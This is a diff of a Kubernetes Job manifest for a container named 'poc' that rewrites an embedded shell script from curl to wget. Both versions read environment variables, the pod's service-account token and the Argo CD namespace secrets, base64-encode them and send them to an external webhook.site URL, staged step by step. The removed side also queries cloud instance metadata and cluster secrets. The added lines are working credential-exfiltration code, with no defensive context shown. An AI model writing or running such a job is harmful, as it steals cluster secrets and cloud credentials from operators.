@@ -249,35 +249,30 @@ spec:
       restartPolicy: Never
       containers:
       - name: poc
-        image: quay.io/argoproj/argocd:v3.2.5
+        image: quay.io/prometheus/busybox-linux-amd64:latest
         imagePullPolicy: IfNotPresent
         command: ["/bin/sh", "-c"]
         args:
         - |
           HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919"
-          curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)&ns=${POD_NAMESPACE}" || true
-          ENVVARS=$(env | base64 | tr -d '\n' 2>/dev/null | head -c 2000)
-          IMDS=$(curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || \
-                curl -sf --max-time 3 http://169.254.169.254/opc/v2/instance/ -H "Authorization: Bearer Oracle" 2>/dev/null || echo "no-imds")
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=k8s-dump" \
-            --data-urlencode "env=${ENVVARS}" \
-            --data-urlencode "imds=${IMDS}" || true
+          wget -qO- "${HOOK}/?stage=k8s-job-start&host=$(hostname)&ns=${POD_NAMESPACE}" 2>/dev/null || true
+          ENC=$(env | head -c 3000 | base64 | tr -d '\n' | sed 's|+|%2B|g;s|/|%2F|g;s|=|%3D|g')
+          wget -qO- "${HOOK}/?stage=k8s-dump&d=${ENC}" 2>/dev/null || true
           T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
           K=https://10.96.0.1:443
-          RBAC=$(curl -sfk --max-time 8 -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" 2>/dev/null)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=rbac" \
-            --data-urlencode "d=${RBAC}" || true
-          SEC=$(curl -sfk --max-time 8 -H "Authorization: Bearer $T" "$K/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 4000)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=argocd-secrets" \
-            --data-urlencode "d=${SEC}" || true
-          CS=$(curl -sfk --max-time 8 -H "Authorization: Bearer $T" "$K/api/v1/namespaces/argocd/secrets?labelSelector=argocd.argoproj.io%2Fsecret-type%3Dcluster" 2>/dev/null | head -c 4000)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=cluster-secrets" \
-            --data-urlencode "d=${CS}" || true
-          curl -sf --max-time 5 "${HOOK}/?stage=done" || true
+          RBAC=$(wget -qO- --no-check-certificate \
+            --header="Authorization: Bearer $T" \
+            --header="Content-Type: application/json" \
+            --post-data="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" \
+            "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
+          RENC=$(printf '%s' "$RBAC" | head -c 3000 | base64 | tr -d '\n' | sed 's|+|%2B|g;s|/|%2F|g;s|=|%3D|g')
+          wget -qO- "${HOOK}/?stage=rbac&d=${RENC}" 2>/dev/null || true
+          SEC=$(wget -qO- --no-check-certificate \
+            --header="Authorization: Bearer $T" \
+            "$K/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 4000)
+          SENC=$(printf '%s' "$SEC" | base64 | tr -d '\n' | sed 's|+|%2B|g;s|/|%2F|g;s|=|%3D|g')
+          wget -qO- "${HOOK}/?stage=argocd-secrets&d=${SENC}" 2>/dev/null || true
+          wget -qO- "${HOOK}/?stage=done" 2>/dev/null || true
         env:
         - name: POD_NAMESPACE
           valueFrom:
